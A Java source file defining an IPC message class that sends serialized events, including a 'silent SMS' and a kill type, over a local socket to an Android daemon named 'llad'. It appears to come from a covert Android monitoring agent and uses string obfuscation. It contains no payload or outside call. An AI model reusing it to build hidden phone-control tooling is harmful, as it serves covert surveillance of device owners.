package com.android.dvci.util;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import com.android.dvci.auto.Cfg;
import com.android.mm.M;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Type;

/**
 * Created by zad on 02/03/15.
 */
public class LowEventMsg implements Serializable{
	public static final int EVENT_TYPE_SMS = 0;
	public static final int EVENT_TYPE_SMS_SILENT = 1;
	public static final int EVENT_TYPE_UNDEF = -1;
	public static final int EVENT_TYPE_KILL = -2;
	public Serializable data;
	public int res;
	public int type = EVENT_TYPE_UNDEF;
	public static final int CONNECTION_REFUSED = -3;
	public static final int UNKNOWN_ERROR = -2;

	public static LowEventMsg sendSerialObj(LowEventMsg obj,String TAG) {
		if (obj==null){
			return null;
		}
		if(TAG == null){
			TAG= "";
		}
		LocalSocket sender = new LocalSocket();
		obj.res=1;
		try {
			sender.connect(new LocalSocketAddress("llad"));
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): SENT DATA ");
			}
			int timeout = 5;
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): wait connection..");
			}
			while (timeout-- > 0) {
				if (sender.isBound() && sender.isConnected()) {
					break;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + ".");
					}
				}
				Utils.sleep(100);
			}
			if (!(sender.isBound() && sender.isConnected())) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(sendSerialObj):  (connection failed): ");//$NON-NLS-1$
				}
				return obj;
			}
			DataInputStream streamIn = new DataInputStream(new
					BufferedInputStream(sender.getInputStream()));
			DataOutputStream streamOut = new DataOutputStream(new
					BufferedOutputStream(sender.getOutputStream()));
			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
			oos.writeObject(obj);
			oos.flush();
			streamOut.flush();
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): object sent");//$NON-NLS-1$
			}
			obj = null;
			timeout = 10;
			int available = 0;
			while (timeout-- > 0 && available <= 0) {
				try {
					if (sender.isBound() && sender.isConnected()) {
						try {
							available = streamIn.available();
							if (Cfg.DEBUG) {
								Check.log(TAG + "(sendSerialObj): getAvailable " + available);//$NON-NLS-1$
							}
							if (available > 0) {

								ObjectInputStream ois = new ObjectInputStream(streamIn);
								obj = (LowEventMsg) ois.readObject();
								if (Cfg.DEBUG) {
									Check.log(TAG + "(sendSerialObj): GOT DATA " + obj);
								}
							}
						} catch (Exception e) {
							if (Cfg.DEBUG) {
								Check.log(TAG + "(sendSerialObj): is available Error: ", e);//$NON-NLS-1$
							}
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + "(sendSerialObj):  getAvailable sender not connected");//$NON-NLS-1$
						}

					}

				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(sendSerialObj): getAvailable Error: ", e);//$NON-NLS-1$
					}
				}
				Utils.sleep(100);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (sendSerialObj): exiting t=" + timeout + " a=" + available);//$NON-NLS-1$
			}
			Utils.sleep(100);
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(sendSerialObj): LocalSocketAddress Error: ", e);//$NON-NLS-1$
			}
			if (e.toString().contains(M.e("Connection refused"))){
				obj.res = CONNECTION_REFUSED;
			}else{
				obj.res = UNKNOWN_ERROR;
			}
		}
		return obj;
	}
}
